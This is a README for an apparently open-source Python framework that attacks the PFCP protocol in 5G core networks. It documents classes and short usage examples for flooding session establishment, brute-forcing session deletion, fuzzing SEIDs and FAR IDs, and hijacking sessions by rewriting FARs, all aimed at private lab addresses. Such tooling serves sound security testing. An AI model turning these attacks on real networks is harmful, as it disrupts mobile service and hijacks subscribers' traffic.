# PFCP Toolkit and Attack Framework

This project provides a set of tools and classes to interact with the PFCP (Packet Forwarding Control Protocol) in 5G core networks. It includes utilities for building and sending PFCP messages, as well as performing various attacks such as DoS, fuzzing, and hijacking.

## Table of Contents
- Overview
- Installation
- Classes and Methods
  - PFCPToolkit
  - PFCPDosAttack
  - PFCPFuzzer
  - PFCPHijack
- Examples
  - PFCP Association Setup
  - PFCP Session Establishment Flood
  - PFCP SEID Fuzzing
  - PFCP Hijack by FAR Manipulation

---

## Overview

This framework is designed for testing and simulating PFCP interactions in a 5G core network. It includes:
- **PFCPToolkit**: A utility class for building and sending PFCP messages.
- **PFCPDosAttack**: A class for performing DoS attacks using PFCP messages.
- **PFCPFuzzer**: A class for fuzzing PFCP parameters like SEIDs and FARs.
- **PFCPHijack**: A class for hijacking PFCP sessions by manipulating FARs.

---

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/your-repo/pfcp-toolkit.git
   cd pfcp-toolkit
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Ensure you have `scapy` installed and configured for PFCP:
   ```bash
   pip install scapy
   ```

---

## Classes and Methods

### PFCPToolkit

The `PFCPToolkit` class provides utilities for building and sending PFCP messages.

#### Methods
- **`Build_PFCP_association_setup_req`**: Builds a PFCP Association Setup Request.
- **`Build_PFCP_session_establishment_req`**: Builds a PFCP Session Establishment Request.
- **`Send_PFCP_association_setup_req`**: Sends a PFCP Association Setup Request.
- **`Send_PFCP_session_establishment_req`**: Sends a PFCP Session Establishment Request.

#### Example
```python
from pfcpToolkit import PFCPToolkit

toolkit = PFCPToolkit(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
toolkit.Send_PFCP_association_setup_req()
toolkit.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")
```

---

### PFCPDosAttack

The `PFCPDosAttack` class is used to perform DoS attacks using PFCP messages.

#### Methods
- **`Start_pfcp_session_establishment_flood`**: Starts a flood of PFCP Session Establishment Requests.
- **`Start_pfcp_session_deletion_bruteforce`**: Performs a brute-force attack by sending PFCP Session Deletion Requests.
- **`Start_pfcp_session_deletion_targeted`**: Targets a specific SEID for deletion.

#### Example
```python
from pfcpDosAttack import PFCPDosAttack

dos = PFCPDosAttack(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
dos.Start_pfcp_session_establishment_flood(reqNbr=100, num_threads=5)
```

---

### PFCPFuzzer

The `PFCPFuzzer` class is used to fuzz PFCP parameters like SEIDs and FARs.

#### Methods
- **`Start_PFCP_SEID_fuzzing`**: Fuzzes SEIDs to discover valid ones.
- **`Start_PFCP_FARID_fuzzing`**: Fuzzes FAR IDs to discover valid ones.

#### Example
```python
from pfcpFuzzer import PFCPFuzzer

fuzzer = PFCPFuzzer()
fuzzer.set_verbose(True)
fuzzer.Start_PFCP_SEID_fuzzing(
    upf_addr="10.100.200.2",
    src_addr="10.100.200.66",
    max_seid=1000,
    max_far_discover=10
)
```

---

### PFCPHijack

The `PFCPHijack` class is used to hijack PFCP sessions by manipulating FARs.

#### Methods
- **`Start_PFCP_hijack_far_manipulation`**: Hijacks a session by modifying FARs.

#### Example
```python
from pfcpHijack import PFCPHijack

hijack = PFCPHijack()
hijack.set_verbose(True)
hijack.Start_PFCP_hijack_far_manipulation(
    hijacker_addr="10.100.200.66",
    upf_addr="10.100.200.2",
    seid=0xC0FFEE
)
```

---

## Examples

### PFCP Association Setup
```python
from pfcpToolkit import PFCPToolkit

toolkit = PFCPToolkit(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
toolkit.Send_PFCP_association_setup_req()
```

### PFCP Session Establishment Flood
```python
from pfcpDosAttack import PFCPDosAttack

dos = PFCPDosAttack(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
dos.Start_pfcp_session_establishment_flood(reqNbr=100, num_threads=5)
```

### PFCP SEID Fuzzing
```python
from pfcpFuzzer import PFCPFuzzer

fuzzer = PFCPFuzzer()
fuzzer.set_verbose(True)
fuzzer.Start_PFCP_SEID_fuzzing(
    upf_addr="10.100.200.2",
    src_addr="10.100.200.66",
    max_seid=1000,
    max_far_discover=10
)
```

### PFCP Hijack by FAR Manipulation
```python
from pfcpHijack import PFCPHijack

hijack = PFCPHijack()
hijack.set_verbose(True)
hijack.Start_PFCP_hijack_far_manipulation(
    hijacker_addr="10.100.200.66",
    upf_addr="10.100.200.2",
    seid=0xC0FFEE
)
```

---

## Notes
- Ensure you are running these scripts in a controlled environment for testing purposes only.
- Modify the IP addresses and ports as per your network setup.
- Use the `verbose=True` flag to enable detailed logging for debugging.

---

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.
